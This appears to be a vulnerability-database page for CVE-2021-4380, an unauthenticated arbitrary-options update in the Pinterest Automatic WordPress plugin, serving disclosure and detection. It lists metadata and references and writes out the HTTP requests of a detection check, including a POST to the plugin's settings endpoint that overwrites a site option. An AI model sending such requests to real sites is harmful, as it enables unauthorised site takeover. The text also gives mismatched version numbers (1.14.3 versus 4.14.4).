---
layout: post
cve_id: CVE-2021-4380
title: Pinterest Automatic < 4.14.4 - Unauthenticated Arbitrary Options Update
pcap: true
pcap_path: /pcaps/2021/CVE-2021-4380.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-4380.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can update arbitrary WordPress options including
  creating administrative accounts or redirecting site visitors to malicious content.

  '
remediation: Fixed in 4.14.4
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-4380
- https://wpscan.com/vulnerability/ffd344fd-de2c-4f27-8932-41aa0a3c3d05
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-pinterest-automatic-pin-security-bypass-4-14-3/
- https://www.wordfence.com/threat-intel/vulnerabilities/id/e4fdc902-4cfe-4116-a294-9a0fcb2de346?source=cve
- https://github.com/20142995/nuclei-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-4380
  epss-score: 0.8366
  epss-percentile: 0.99258
  cpe: cpe:2.3:a:valvepress:pinterest_automatic_pin:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: valvepress
  product: pinterest_automatic_pin
  framework: wordpress
tags:
- cve
- cve2021
- wordpress
- wp
- wp-plugin
- wp
- vkev
- intrusive
- pinterest-automatic-pin
- vuln
---

## ðŸ” Vulnerability Description
The Pinterest Automatic plugin for WordPress is vulnerable to authorization bypass due to missing capability checks on the 'wp_pinterest_automatic_parse_request' function and the 'process_form.php' script in versions up to, and including, 1.14.3. This makes it possible for unauthenticated attackers to update arbitrary options on a site that can be used to create new administrative user accounts or redirect unsuspecting site visitors.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /?wp_pinterest_automatic=settings HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
blogdescription=baAdjw!
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Accept-Encoding: gzip
```

